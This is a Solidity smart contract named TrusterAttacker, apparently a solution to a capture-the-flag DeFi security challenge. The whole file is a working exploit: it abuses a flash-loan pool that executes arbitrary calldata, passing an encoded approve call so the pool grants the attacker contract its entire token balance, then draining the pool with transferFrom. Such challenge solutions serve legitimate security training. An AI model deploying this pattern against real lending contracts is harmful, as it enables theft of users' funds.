// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title TrusterAttacker
 * @author Yasaman (Jasmine) Abtahi
 */

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../truster/TrusterLenderPool.sol";

contract TrusterAttacker {

    using SafeMath for uint256;
    using Address for address payable;
    TrusterLenderPool pool;
    IERC20 token;

    constructor(address payable _TrusterLenderPool, address _token) {
        pool = TrusterLenderPool(_TrusterLenderPool);
        token = IERC20(_token);
    }

    function attack(address payable attacker) public {
        bytes memory callData = abi.encodeWithSignature("approve(address,uint256)", address(this), token.balanceOf(address(pool)));
        pool.flashLoan(0, address(this), address(token), callData);
        token.transferFrom(address(pool), attacker, token.balanceOf(address(pool)));
    }


}
